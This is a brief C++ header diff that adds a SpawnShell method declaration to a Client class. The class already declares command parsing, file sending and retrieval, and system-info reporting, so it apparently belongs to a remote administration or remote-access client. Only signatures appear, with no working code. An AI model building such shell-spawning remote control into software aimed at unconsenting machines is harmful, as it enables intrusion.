@@ -21,6 +21,7 @@ class Client{
 		bool ParseCommand(char*&);
 		
 		bool SendFile(const std::string);
+		void SpawnShell(const std::string);
 		bool SendInfo();
 		bool SendFullInfo();
 		void RetrieveFile(u64, c_char, const std::string);
